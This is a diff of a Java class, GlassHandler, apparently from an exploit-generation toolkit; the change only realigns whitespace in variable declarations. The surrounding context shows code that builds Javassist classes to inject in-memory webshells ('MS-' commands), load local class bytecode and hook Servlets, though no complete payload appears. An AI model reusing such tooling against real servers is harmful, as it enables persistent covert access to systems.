@@ -14,8 +14,8 @@ import java.util.List;
 
 public class GlassHandler {
     public static CtClass generateClass(String target) throws Exception {
-        String  newClassName = ClassNameHandler.generateClassName();
-        CtClass ctClass      = generateClass(target, newClassName);
+        String newClassName = ClassNameHandler.generateClassName();
+        CtClass ctClass = generateClass(target, newClassName);
 
         // 如果需要，保存类文件
         Utils.saveCtClassToFile(ctClass);
@@ -28,9 +28,9 @@ public class GlassHandler {
             target = target.substring(3);
 
             // 内存马类型
-            String shellType     = "";
-            String memShellName  = "";
-            Class  memShellClazz = null;
+            String shellType = "";
+            String memShellName = "";
+            Class memShellClazz = null;
 
             // 如果命令以 MS 开头，则代表是注入内存马
             if (target.startsWith("MS-")) {
@@ -67,8 +67,8 @@ public class GlassHandler {
         // 如果命令以 LF- 开头 （Local File），则程序可以生成一个能加载本地指定类字节码并初始化的逻辑，后面跟文件路径-类名
         if (target.startsWith("LF-")) {
             target = target.substring(3);
-            String  filePath = target.contains("-") ? target.split("[-]")[0] : target;
-            CtClass ctClass  = Config.POOL.makeClass(new FileInputStream(filePath));
+            String filePath = target.contains("-") ? target.split("[-]")[0] : target;
+            CtClass ctClass = Config.POOL.makeClass(new FileInputStream(filePath));
             ctClass.setName(newClassName);
 
             // 对本地加载的类进行缩短操作
@@ -83,8 +83,8 @@ public class GlassHandler {
 
     public static CtClass generateClass(Class clazz, String shellType, String newClassName) throws Exception {
 
-        CtClass ctClass   = null;
-        byte[]  byteCodes = null;
+        CtClass ctClass = null;
+        byte[] byteCodes = null;
 
         String exClassName = clazz.getName();
         ctClass = Config.POOL.get(exClassName);
@@ -157,11 +157,11 @@ public class GlassHandler {
 
     public static void prepareMemoryJar(CtClass templateClass) throws Exception {
         // 首先将 SuURLConnection/SuURLStreamHandler 改名
-        final String nameA    = ClassNameHandler.searchClassByName("SuURLConnection");
+        final String nameA = ClassNameHandler.searchClassByName("SuURLConnection");
         final String newNameA = ClassNameHandler.generateClassName();
-        final String nameB    = ClassNameHandler.searchClassByName("SuURLStreamHandler");
+        final String nameB = ClassNameHandler.searchClassByName("SuURLStreamHandler");
         final String newNameB = ClassNameHandler.generateClassName();
-        CtClass      ctClassA = Config.POOL.get(nameA);
+        CtClass ctClassA = Config.POOL.get(nameA);
         ctClassA.setName(newNameA);
         CtClass ctClassB = Config.POOL.get(nameB);
         ctClassB.setName(newNameB);
@@ -186,7 +186,7 @@ public class GlassHandler {
 
     public static void prepareClassModifier(CtClass templateClass, String hookType, String args) throws Exception {
         CtClass classModifier = Config.POOL.get(ClassNameHandler.searchClassByName("ClassModifier"));
-        String  shell         = "";
+        String shell = "";
 
         // 插入 Hook 点
         if (hookType.equals("Servlet")) {
